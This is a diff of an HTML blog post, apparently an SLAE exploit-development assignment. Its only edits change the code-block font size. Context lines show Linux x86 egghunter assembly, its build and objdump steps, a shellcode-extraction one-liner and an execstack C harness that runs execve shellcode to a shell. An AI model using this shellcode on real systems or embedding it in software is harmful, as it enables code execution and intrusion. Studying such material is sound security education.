@@ -50,7 +50,7 @@ return 0;
 
 After compiling and executing the program the results will be as follows
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents</b></span># gcc -o pagesize pagesize.c
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents</b></span># ./pagesize
 the page size is 4096 bytes.
@@ -102,7 +102,7 @@ The steps to build the <strong>Egghunter</strong> will be the following
 <h3><span style="color:#339966;">Analysis and Implementation&nbsp;</span></h3>
 <p style="text-align:justify;">First the following three instructions will be used to initialise registers. The <strong>ebx</strong> contains the four byte version of the egg tag that is searched, which, in this case is <strong>0x50905090. </strong>Then the <strong>ecx </strong>register will be zeroed out using <strong>xor</strong> instruction as well the <strong>edx</strong> and <strong>eax</strong> using <strong>mul</strong> instruction.</p>
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 _start:  
 mov ebx, 0x50905090    <span style="color:#33cccc;">; Store EGG in EDX </span>
 xor ecx, ecx           <span style="color:#33cccc;">; Zero out ECX  </span>
@@ -111,7 +111,7 @@ mul ecx                <span style="color:#33cccc;">; Zero out EAX and EDX </spa
 
 <p style="text-align:justify;">Next, the <strong>dx</strong> register will be used to perform memory alignment while taking into consideration the smallest granular unit of memory on <em>IA32</em> which is <em>PAGE_SIZE</em> with the size of <strong>4096</strong> bytes. The memory alignment must be performed in case an invalid memory address might returned from the <em>mkdir(2)</em> syscall, where in such case all addresses in the memory page will also be invalid. So, in order to avoid shellcode from breaking because of the existence of null bytes in case of the hex representation of <strong>4096</strong> bytes (<strong>0x1000</strong>), the following technique will be followed</p>
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 npage:                    
 or dx, 0xfff    <span style="color:#33cccc;">; Align a region of memory</span>
 </pre>
@@ -119,7 +119,7 @@ or dx, 0xfff    <span style="color:#33cccc;">; Align a region of memory</span>
 <p style="text-align:justify;">Next, <strong>pushad</strong> instruction will push all general registers into the stack in order to preserve values to be used with <em>mkdir(2)</em> syscall. Later on, the <strong>ebx</strong> register will hold the address <strong>[edx+4]</strong> and then the lower byte register <strong>al</strong> will be assigned with the immediate value <b>0x0c </b>which represents the <em>mkdir(2)</em> syscall. After that, the <strong>int 0x80</strong> instruction will call <em>mkdir(2)</em>&nbsp;syscall. Later on, the return value from <em>mkdir(2)</em>&nbsp;syscall will be compared with the hex value <strong>0xf2</strong> which represents the <strong>EFAULT</strong> errno value.</p>
 
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 naddr:
 inc edx            <span style="color:#33cccc;">; increase EDX to achieve 4096 bytes page (4KiB) </span>                                  
 pushad             <span style="color:#33cccc;">; push the general purpose values into the stack </span>
@@ -131,7 +131,7 @@ cmp al, 0xf2       <span style="color:#33cccc;">; 0xf2 is 242 in decimal - check
 
 <p style="text-align:justify;">Then all the registers will restore their values by using <strong>popad</strong> instruction. In case the <em>mkdir(2)</em> syscall doesn't return <strong>EFAULT</strong>, then the value stored in <strong>ebx</strong>&nbsp;will be compared with the value contained in <strong>[edx]</strong> address in order to check if the egg<strong> 0x50905090</strong>&nbsp;tag is located inside this address. Otherwise, in case the <em>mkdir(2)</em> syscall returns <strong>EFAULT</strong>, then the memory address space will be indicated as invalid and the search will be forwarded to the next page. Also in case the first comparison is successful, meaning the egg<strong> 0x50905090 </strong>tag is found, the next<em> four(4)</em> bytes will also be checked in order to find out if the second egg<strong> 0x50905090</strong>&nbsp;tag is also assigned. Furthermore, if the egg<strong> 0x50905090</strong>&nbsp;tag is not assigned to the address <strong>[edx+4], </strong>the next address will also be checked, otherwise <strong>[edx]</strong> and <strong>[edx+4]</strong> will contain the egg tag.</p>
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 popad            <span style="color:#33cccc;">; restore the general purpose registers </span>
 jz npage         <span style="color:#33cccc;">; if mkdir() returned EFAULT, go to the next page </span>
 cmp [edx], ebx   <span style="color:#33cccc;">; check if egg 0x50905090 tag is in [edx] address </span>
@@ -143,14 +143,14 @@ jmp edx          <span style="color:#33cccc;">; [edx] and [edx+4] contain the se
 
 Now lets proceed further and test the hunter. First, the program will be compiled using the following commands
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment3</b></span># nasm -f elf -o egg.o egg.nasm
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment3</b></span># ld -z execstack -o egg egg.o
 </pre>
 
 Then the opcodes will be checked if null bytes exist using&nbsp;<strong>objdump</strong>
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment3</b></span># objdump -M intel -D egg
 
 egg:     file format elf32-i386
@@ -184,7 +184,7 @@ Disassembly of section .text:
 
 Then the <em>shellcode&nbsp;</em>will be produced using <strong>objdump</strong>&nbsp;as follows
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment3</b></span># objdump -d ./egg|grep '[0-9a-f]:'|grep -v 
 'file'|cut -f2 -d:|cut -f1-5 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 
 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
@@ -224,7 +224,7 @@ int main()
 if we compile and run the code above we will have a our&nbsp; execve shellcode executed
 
 
-<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 14px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
+<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 15px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment3</b></span># gcc -fno-stack-protector -g -z execstack -m32 -o shell shell.c ./shell
 Shellcode Length: 33
 #
